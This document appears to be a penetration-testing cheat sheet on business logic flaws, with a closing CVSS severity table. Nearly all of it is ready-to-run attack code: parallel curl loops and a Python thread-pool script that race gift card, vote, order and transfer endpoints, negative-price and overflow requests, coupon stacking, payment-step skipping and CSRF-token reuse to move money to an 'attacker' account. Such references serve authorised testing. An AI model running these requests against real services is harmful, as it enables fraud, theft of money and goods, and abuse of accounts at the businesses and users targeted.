# Business Logic Flaws: Complete Reference

## Race Conditions

### TOCTOU (Time-of-Check Time-of-Use)
```bash
# Gift card redemption: check balance then deduct
# Send multiple redemption requests in parallel
for i in {1..100}; do
  curl -X POST /api/redeem -d "code=GIFT100" &
done

# Coupon usage
for i in {1..50}; do
  curl -X POST /api/cart/checkout -d "coupon=SAVE50" &
done

# Parallel password change -> session takeover
# Change password to known value while authenticated
# Old session might still be valid
```

### Limit Bypass via Race
```bash
# Voting/rating: limit one vote per user
for i in {1..100}; do
  curl -X POST /api/vote -d "item=123&rating=5" &
done

# Inventory: buy more than stock
for i in {1..100}; do
  curl -X POST /api/order -d "product=PS5&qty=1" &
done

# Wallet transfer: transfer same amount multiple times
for i in {1..100}; do
  curl -X POST /api/transfer -d "to=attacker&amount=100" &
done
```

### Exploit Script
```python
import concurrent.futures
import requests

def race_request(i):
    return requests.post(url, data=data, cookies=cookies)

# Gift card race
url = "https://target.com/api/redeem"
data = {"code": "GIFT100"}
cookies = {"session": "my_token"}

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
    futures = [ex.submit(race_request, i) for i in range(100)]
    results = [f.result() for f in futures]
    successes = [r for r in results if r.status_code == 200]
    print(f"Successful redemptions: {len(successes)}")
```

## Payment Logic Flaws

### Price Manipulation
```bash
# Negative quantity
curl -X POST /api/cart/add -d "product=TV&price=-1000&qty=1"

# Integer overflow
curl -X POST /api/cart/add -d "product=TV&qty=99999999999"

# Fractional quantity
curl -X POST /api/cart/add -d "product=TV&qty=0.5"

# Currency manipulation
curl -X POST /api/checkout -d "currency=USD&amount=0.01"

# Price as string
{"price": "0.01", "original_price": "100.00"}

# Modify price in cart/edit endpoint
PUT /api/cart/item/123
{"price": 0.01}
```

### Coupon Abuse
```bash
# Stack coupons indefinitely
curl -X POST /api/cart/apply-coupon -d "code=FIRST10"
curl -X POST /api/cart/apply-coupon -d "code=ANOTHER20"

# Reuse expired coupons
curl -X POST /api/cart/checkout -d "coupon=EXPIRED2023"

# Self-referral loops
# Create account A -> refer yourself -> create account B -> refer yourself
# Infinite referral credits

# Minimum/maximum order bypass
# Apply coupon below minimum
curl -X POST /api/cart/checkout -d "coupon=SAVE50&total=1.00"
```

## State Machine Manipulation

### Skipping Steps
```bash
# Multi-step checkout: Cart -> Shipping -> Payment -> Confirm
# Skip directly to Confirm
curl -X POST /api/order/confirm -d "order=123"

# Complete checkout without payment
# Intercept "Payment" step, send "Confirm" directly

# Create account without email verification
# Skip the verify step
curl -X POST /api/register -d "username=admin&password=hacked"
curl -X POST /api/activate -d "skip_verification=true"
```

### Reordering Steps
```bash
# Return to previous step to modify state
# Checkout step 3 (payment) done, go back to step 1 (cart)
# Add more items at already-paid price

# Re-use expired flows
# Session: Step 1 -> Step 2 -> Step 3 (payment)
# New session: Skip to Step 3 using old data
```

### Double-Use Tokens
```bash
# Password reset token -> change password twice
curl -X POST /api/reset -d "token=VALIDTOKEN&password=newpass1"
curl -X POST /api/reset -d "token=VALIDTOKEN&password=newpass2"

# CSRF token reuse
curl -X POST /api/transfer -b "session=user" -d "csrf=TOKEN&to=attacker&amount=100"
curl -X POST /api/transfer -b "session=user" -d "csrf=TOKEN&to=attacker&amount=100"
```

## Workflow Abuse

### Account Registration
```bash
# Mass account creation
# No CAPTCHA, no rate limit -> create 1000 accounts
for i in {1..1000}; do
  curl -X POST /api/register -d "username=user$i&password=test123"
done

# Email verification bypass
# Register with verified email, then change to unverified
# Response manipulation
{"verified": false} -> {"verified": true}

# Delete account -> re-register with same email
# Might bypass email verification
```

### Invitation/Referral Abuse
```bash
# Self-referral loop
curl -X POST /api/invite -d "email=attacker+1@target.com"
curl -X POST /api/invite -d "email=attacker+2@target.com"
# Both refer back to main account

# Invite admin users
curl -X POST /api/invite -d "email=admin@target.com&role=admin"
```

### Subscription Abuse
```bash
# Cancel subscription -> continue using premium features
# Free trial -> cancel -> start new free trial with another email
# Downgrade plan -> keep premium data

# Subscription billing cycle manipulation
# Change date to avoid payment
```

## Edge Cases

### Boundary Conditions
```bash
# Maximum values
curl -X POST /api/transfer -d "amount=99999999999"

# Minimum values
curl -X POST /api/withdraw -d "amount=0.01"

# Empty/null values
curl -X POST /api/profile -d '{"email": null}'
curl -X POST /api/profile -d '{"email": ""}'
```

### Input Validation Logic
```bash
# Client-side validation only
# Disable JavaScript, submit directly:
curl -X POST /api/checkout -d "zipcode=notazip&email=notanemail"

# Same origin for same name policy
# Submit form with different rendering vs validation logic
```

### CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| Race condition -> financial loss | 7.5 | Network, Low, No auth, Integrity high |
| Price manipulation | 8.5 | Network, Low, No auth, Integrity high |
| Unlimited coupon stacking | 6.5 | Network, Low, No auth, Integrity medium |
| State machine bypass -> free content | 5.3 | Network, Low, No auth, Integrity low |
| Mass account creation | 5.0 | Network, Low, No auth, No direct impact |
| Step skipping (payment bypass) | 9.1 | Network, Low, No auth, All high |